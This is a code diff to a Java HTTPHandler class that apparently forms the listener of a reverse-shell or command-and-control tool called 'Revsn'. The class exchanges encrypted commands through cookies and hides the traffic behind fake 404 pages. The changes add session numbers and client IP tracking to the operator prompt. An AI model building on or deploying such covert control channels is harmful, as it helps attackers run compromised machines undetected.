@@ -33,8 +33,8 @@ import javax.crypto.spec.SecretKeySpec;
 
 import org.apache.commons.codec.binary.Base64;
 
-public class HTTPHandler implements HttpRequestHandler, HttpHandler {
-    Logger logger = LogManager.getLogger(getClass());
+public class HTTPHandler implements HttpRequestHandler, HttpHandler{
+    private static final Logger logger = LogManager.getLogger(HTTPHandler.class);
     
     //private volatile List<String> commands = new ArrayList<>();
     private volatile String answerCommands;
@@ -43,6 +43,9 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler {
     private IvParameterSpec iv;
     private SecretKey keyRaw;
     private IvParameterSpec ivRaw;
+    private volatile int sessionNumber;
+    private volatile String ip;
+    private volatile boolean first = true;
 
     private Cipher cipherDec;
     private Cipher cipherEnc;
@@ -52,9 +55,10 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler {
 
     protected static final String https404 = new String("<html><body><h1>Not found</h1></body></html>");
 
-    public HTTPHandler(SecretKey key1, IvParameterSpec iv) {
+    public HTTPHandler(SecretKey key1, IvParameterSpec iv, int sessionNumber) {
         super();
         this.keyRaw = key1;
+        this.sessionNumber = sessionNumber;
         this.ivRaw = iv;
         this.key = new SecretKeySpec(key1.getEncoded(), key1.getAlgorithm());
         this.iv = new IvParameterSpec(iv.getIV());
@@ -87,6 +91,11 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler {
     public void handle(HttpRequest request, HttpResponse response, HttpContext context) throws HttpException, IOException {
         String msg = "";
         String cookie = "";
+        if(first) { 
+            String[] host = request.getHeaders("Host")[0].getValue().split(":");
+            ip = host[0];
+            first = false;
+        }
         if(request.getRequestLine().getMethod().toUpperCase().contains("GET") && request.getRequestLine().getUri().contains("lit")) {
             if(request.getHeaders("Cookie") != null) {
                 cookie = request.getHeaders("Cookie")[0].getValue();
@@ -118,7 +127,7 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler {
 
                     } else {
                         logger.info(msg);
-                        System.out.print("Revsn [HTTP] » ");
+                        System.out.print("Revsn [HTTP]["+ ip +"]["+sessionNumber+"]» ");
                     }
                     response.setStatusCode(200);
                     response.setEntity(http404);
@@ -133,7 +142,10 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler {
     public boolean getConnInf() {
         return this.est;
     }
+        
 
+    //Old for HTTPS
+    
     @Override
     public void handle(HttpExchange ex) throws IOException {
         String msg = "";
@@ -190,7 +202,7 @@ public class HTTPHandler implements HttpRequestHandler, HttpHandler {
         }
         
     }
-
+    
     public SecretKey getKeyRaw() {
         return this.keyRaw;
     }
